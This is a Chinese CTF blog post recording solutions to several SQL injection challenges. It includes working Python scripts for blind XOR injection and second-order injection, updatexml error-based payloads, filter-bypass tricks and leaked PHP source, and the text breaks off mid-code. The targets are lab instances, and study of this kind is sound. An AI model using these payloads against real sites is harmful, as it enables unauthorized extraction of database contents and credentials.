<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/black/pace-theme-flash.css" rel="stylesheet">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon2.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon2.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="Black watch 入群题 盲注 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport urllibimport sysfrom time import sleep# if correct , return empty, else return s">
<meta name="keywords" content="CTF WEB">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL 题型记录[working forever]">
<meta property="og:url" content="http://yoursite.com/2019/04/22/SQL题型记录/index.html">
<meta property="og:site_name" content="CH4SER || 自闭室">
<meta property="og:description" content="Black watch 入群题 盲注 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport urllibimport sysfrom time import sleep# if correct , return empty, else return s">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/images/image-20200109205645682.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71089636-42797800-21dc-11ea-817e-afef75383bf4.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71090399-e879b200-21dd-11ea-86f4-fe14182456c1.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71090386-de57b380-21dd-11ea-8bcb-220f4ffbaf93.png">
<meta property="og:image" content="c:%5CUsers%5Cch4ser__%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191216152057800.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70886814-6344a080-2017-11ea-8a04-415a612ee2ab.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70886862-82433280-2017-11ea-955d-98e9eccec93b.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70391534-502b4280-1a11-11ea-9761-3c0c2754fb47.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70391962-95517380-1a15-11ea-8b9f-7e1d76a23770.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70123884-86ce2980-16ae-11ea-83e0-367a142a00ad.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61634032-fd035e00-acc2-11e9-8eaf-a6ff3a9fb412.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61634710-7b143480-acc4-11e9-8a71-2458db059585.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61634735-89fae700-acc4-11e9-930c-0c990671b453.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61634744-91ba8b80-acc4-11e9-88ff-60e14a675ad0.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57983217-e271f600-7a81-11e9-9dd5-d087a09c7716.png">
<meta property="og:updated_time" content="2020-01-21T07:15:59.215Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SQL 题型记录[working forever]">
<meta name="twitter:description" content="Black watch 入群题 盲注 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport urllibimport sysfrom time import sleep# if correct , return empty, else return s">
<meta name="twitter:image" content="http://yoursite.com/images/image-20200109205645682.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/04/22/SQL题型记录/">





  <title>SQL 题型记录[working forever] | CH4SER || 自闭室</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">CH4SER || 自闭室</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">志之难也,不在胜人,而在自胜.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/SQL题型记录/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ch4ser">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/dogdog.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CH4SER || 自闭室">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">SQL 题型记录[working forever]</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-22T01:43:42+08:00">
                2019-04-22
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">Post modified&#58;</span>
              
              <time title="Post modified" itemprop="dateModified" datetime="2020-01-21T15:15:59+08:00">
                2020-01-21
              </time>
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/题型记录/" itemprop="url" rel="index">
                    <span itemprop="name">题型记录</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  6.4k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  34
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="Black-watch-入群题">Black watch 入群题</h2>
<p>盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment"># if correct , return empty, else return something</span></span><br><span class="line">url = <span class="string">"http://35a2727d-75e8-46cb-84e0-ddc9e31f4a2e.node3.buuoj.cn/backend/content_detail.php?id="</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># [+] --&gt;admin,contents&lt;--</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># id,title,content,is_enable</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># id,username,password,is_enable</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(password))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># fb7a64bd,dd1d82b3</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(username))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># d2276f28,2315045d</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> u_bound &gt;= l_bound:</span><br><span class="line">        m_bound = (u_bound + l_bound) // <span class="number">2</span></span><br><span class="line">        payload_tmp = payload.format(index, m_bound)</span><br><span class="line">        url_tmp = url + urllib.parse.quote(payload_tmp)</span><br><span class="line">        res = requests.get(url_tmp).content.decode(<span class="string">'utf8'</span>)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="comment"># exit(0)</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"title"</span> <span class="keyword">in</span> res:</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">            tmp = m_bound</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(tmp)</span></span><br><span class="line">    result += chr(tmp)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="comment"># sys.stdout.write("[+] --&gt;%s&lt;--\r" % (result))</span></span><br><span class="line">    <span class="comment"># sys.stdout.flush()</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<h2 id="网鼎杯-2018-unfinished">网鼎杯 2018 unfinished</h2>
<p>考察二次注入</p>
<p>注册的时候用到了<code>username</code>, <code>email</code>, <code>password</code>, 然后登录的时候用到了<code>email</code>, <code>password</code>.登录进去之后会显示用户名, 这也是一种可能的二次注入特征, 这道题目的源码中只是对注册用的<code>username</code>做了一些黑名单过滤而没有addslashes, 这就导致sql注入查询出的数据就被插入进数据库中, 登录的时候就可以查看了.</p>
<p>第一个知识点:</p>
<blockquote>
<p>字符串被hex之后会带有数字和字母, 但是将hex串再hex之后就是纯数字了, 但是这样子会很长很长, 导致查询的结果会是用科学计数法表示, 所以需要用substr来截取最后统一解码</p>
</blockquote>
<p>第二个知识点: 数字字符串和数字相加后会有一个类型转换</p>
<p><img src="/images/image-20200109205645682.png" alt="image-20200109205645682"></p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://4c59ef6a-d690-4b63-9c3d-5ecb1f857679.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_result</span><span class="params">(result)</span>:</span></span><br><span class="line">    pattern = re.compile(<span class="string">r"""&lt;span class="user-name"&gt;\n            (\d+)          &lt;/span&gt;"""</span>)</span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line">    <span class="comment"># print(type(result))</span></span><br><span class="line">    a = pattern.findall(result.decode(<span class="string">'utf8'</span>))[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(type(a))</span></span><br><span class="line">    hex_num = int(pattern.findall(result.decode(<span class="string">"utf-8"</span>))[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">    result_string = long_to_bytes(hex_num)</span><br><span class="line">    <span class="comment"># print(result_string)</span></span><br><span class="line">    <span class="keyword">return</span> result_string.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(payload)</span>:</span></span><br><span class="line">    email = str(random.randint(<span class="number">0</span>,<span class="number">999</span>))+<span class="string">"@qq.com"</span></span><br><span class="line">    username = <span class="string">"0'+("</span>+payload+<span class="string">")+'0"</span></span><br><span class="line">    password = <span class="string">'200215'</span></span><br><span class="line">    send_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>: email,</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(send_data)</span></span><br><span class="line">    res = requests.post(url+<span class="string">"register.php"</span>, data=send_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print(res.content)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">return</span> email</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line">    email = email</span><br><span class="line">    password = <span class="string">'200215'</span></span><br><span class="line">    send_data = &#123;</span><br><span class="line">        <span class="string">'email'</span>:email,</span><br><span class="line">        <span class="string">'password'</span>:password</span><br><span class="line">    &#125;</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(send_data)</span></span><br><span class="line">    res = requests.post(url+<span class="string">'login.php'</span>, data=send_data, headers=header, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># print(res.content)</span></span><br><span class="line">    <span class="keyword">return</span> res.content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_payload</span><span class="params">(payload)</span>:</span></span><br><span class="line">    email = register(payload)</span><br><span class="line">    <span class="comment"># print(email)</span></span><br><span class="line">    result_content = login(email)</span><br><span class="line">    result_string = find_result(result_content)</span><br><span class="line">    <span class="keyword">return</span> result_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    payload_mod = <span class="string">"select substr(hex(hex((select * from flag)))from &#123;0&#125; for 10)"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">900</span>,<span class="number">10</span>):</span><br><span class="line">        payload = payload_mod.format(i)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        flag += handle_payload(payload)</span><br><span class="line">        flag_num = int(flag, <span class="number">16</span>)</span><br><span class="line">        result = long_to_bytes(flag_num)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        sys.stdout.write(<span class="string">"[+] %s\r"</span> % (result))</span><br><span class="line">        sys.stdout.flush()</span><br></pre></td></tr></table></figure>
<p>注意</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select hex(hex(select username from users)); 这条语句新版本已经不能用了, 我测的是10.3.20-MariaDB-1</span><br><span class="line">select hex(hex(username)) from users; 这条还可以用</span><br></pre></td></tr></table></figure>
<p>当然盲注也可以, 语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and((select substr((%s)from(%d)for(1))=&apos;%s&apos;))and&apos;1</span><br></pre></td></tr></table></figure>
<h2 id="RCTF2015-EasySQL">[RCTF2015]EasySQL</h2>
<p>考察二次注入</p>
<p>开局注册登录和改密码操作, 推测二次注入, 注册的时候过滤的<code>mid, substr, and,空格, /**/</code>等等, 采用括号的方式来写语句, 用这个语句作为用户名去注册登录并且修改密码就会有报错注入.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1);#</span><br></pre></td></tr></table></figure>
<p>查users这个表, 但是默认会查到系统自带的, 再增加一个条件就行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;users&quot;)&amp;&amp;(table_schema=database()),0x7e),1);#</span><br></pre></td></tr></table></figure>
<p>就可以知道列名.</p>
<p>尝试查询, 发现很多项的内容都是xxx, 但是substr又不能用, 就用条件判断好了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here!=&quot;xxx&quot;)),0x7e),1);#</span><br><span class="line"></span><br><span class="line">1&quot;&amp;&amp;updatexml(1,concat(0x7e,(select(reverse(group_concat(real_flag_1s_here)))from(users)where(real_flag_1s_here!=&quot;xxx&quot;)),0x7e),1);#</span><br></pre></td></tr></table></figure>
<h2 id="实验课遇见的题目">实验课遇见的题目</h2>
<p>语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from t_info where username = &apos;$name&apos; or nickname = &apos;$name&apos;</span><br></pre></td></tr></table></figure>
<p>双参数注入, 要求返回结果不为空</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=or(1)#\</span><br></pre></td></tr></table></figure>
<h2 id="极客大挑战-Final-SQL">极客大挑战 Final SQL</h2>
<p>过滤了很多, 然后在id处测出了异或注入.</p>
<p>过滤了空格和星号, 用括号绕过, 然后注, 读flag表:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/71089636-42797800-21dc-11ea-817e-afef75383bf4.png" alt="image"></p>
<p>怎么这么多垃圾数据? 倒过来读一下看吧</p>
<p><img src="https://user-images.githubusercontent.com/40637063/71090399-e879b200-21dd-11ea-86f4-fe14182456c1.png" alt="image"></p>
<p>👴哭了</p>
<p>去读另一张表了, 这次还是从最后一位往前读</p>
<p><img src="https://user-images.githubusercontent.com/40637063/71090386-de57b380-21dd-11ea-8bcb-220f4ffbaf93.png" alt="image"></p>
<p>脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database()))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  F1naI1y,Flaaaaag</span></span><br><span class="line"><span class="comment">#  url = "http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp('Flaaaaag'))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">-1</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> l_bound &lt;= u_bound:</span><br><span class="line">        m_bound = (l_bound + u_bound) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#  url_tmp = "http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp('F1naI1y'))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))".format(index, m_bound)</span></span><br><span class="line">        url_tmp = <span class="string">"http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span>.format(index, m_bound)</span><br><span class="line">        <span class="comment">#  url_tmp = url.format(index, m_bound)</span></span><br><span class="line">        res = requests.get(url_tmp).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> res:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">            tmp = m_bound</span><br><span class="line">    result = chr(tmp) + result</span><br><span class="line">    print(result)</span><br><span class="line">    index -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="XDCTF-2015-filemanager">XDCTF  2015 filemanager</h2>
<p>提供了文件上传, 删除和改名的功能, 有源码泄露, 删除功能没什么用, 其他关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// common.inc.php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>($_GET, $_POST, $_COOKIE) <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">		is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// upload.php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES) &#123;</span><br><span class="line">	$file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">	<span class="keyword">if</span> ($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">		$name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">		$path_parts = pathinfo($name);</span><br><span class="line"></span><br><span class="line">		